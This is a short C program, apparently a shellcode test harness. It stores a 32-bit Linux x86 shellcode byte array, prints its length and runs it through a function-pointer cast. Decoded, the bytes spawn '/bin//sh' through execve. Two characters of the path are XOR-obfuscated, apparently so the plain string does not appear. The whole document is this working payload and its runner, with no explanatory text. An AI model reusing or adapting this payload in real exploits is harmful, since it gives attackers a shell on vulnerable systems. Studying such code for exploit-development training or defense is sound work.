#include <stdio.h>  
#include <string.h>  

unsigned char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x60\x80\x74\x24\x03\x08\x68\x2f\x62\x69\x60\x80\x74\x24\x03\x0e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";
int main()  
{  
    printf("shellcode  size: %d\n", strlen(shellcode));  
    int (*ret)() = (int(*)())shellcode;  
    ret();  
}  

